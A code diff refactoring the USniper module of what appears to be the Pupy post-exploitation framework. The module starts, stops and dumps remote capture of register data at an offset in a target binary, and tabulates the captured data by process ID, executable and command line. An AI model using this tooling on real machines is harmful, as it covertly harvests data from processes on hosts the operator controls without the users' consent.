@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 
 from pupylib.PupyModule import *
-from pupylib.utils.rpyc_utils import obtain
 
 __class_name__ = 'USniper'
 
@@ -46,31 +45,30 @@ class USniper(PupyModule):
         else:
             offset = '0x' + offset[2:].upper()
 
-        if self.client.conn.modules['usniper'].start(
-                args.path,
-                offset,
-                args.reg,
-                args.ret,
-                'string' if args.string else None,
-                None if ( args.string or args.nochar ) else 'chr'
-            ):
+        start = self.client.remote('usniper', 'start')
+
+        if start(args.path, offset, args.reg, args.ret,
+                 'string' if args.string else None,
+                     None if ( args.string or args.nochar ) else 'chr'):
             self.success('Unsipper started')
         else:
             self.error('Usniper start failed')
 
     def stop(self, args):
-        self.client.conn.modules['usniper'].stop()
+        stop = self.client.remote('usniper', 'stop')
+        stop()
         self.success('Stop request was sent')
 
     def dump(self, args):
-        data = self.client.conn.modules['usniper'].dump()
+        dump = self.client.remote('usniper', 'dump')
+
+        data = dump()
         if not data:
             self.warning('No data collected')
             return
 
         records = []
 
-        data = obtain(data)
         for pid, values in data.iteritems():
             for timestamp, dumps in values['dump'].iteritems():
                 if all(len(x) == 1 and type(x) in (str,unicode) for x in dumps):
@@ -78,18 +76,18 @@ class USniper(PupyModule):
                         'PID': pid,
                         'EXE': values['exe'],
                         'CMD': ' '.join(values['cmd']),
-                        'DATA': ''.join(dumps)
+                        'DATA': ''.join(dumps).strip(' \0')
                     })
                 else:
                     for dump in dumps:
                         records.append({
                             'PID': pid,
-                            'DATA': dump,
+                            'DATA': dump.strip(' \0'),
                             'EXE': values['exe'],
                             'CMD': ' '.join(values['cmd'])
                         })
 
-        self.table(records, wl=['PID', 'EXE', 'CMD', 'DATA'])
+        self.table(records, ['PID', 'EXE', 'CMD', 'DATA'])
 
     def run(self, args):
-        args.func(args)
+        args.func(self, args)
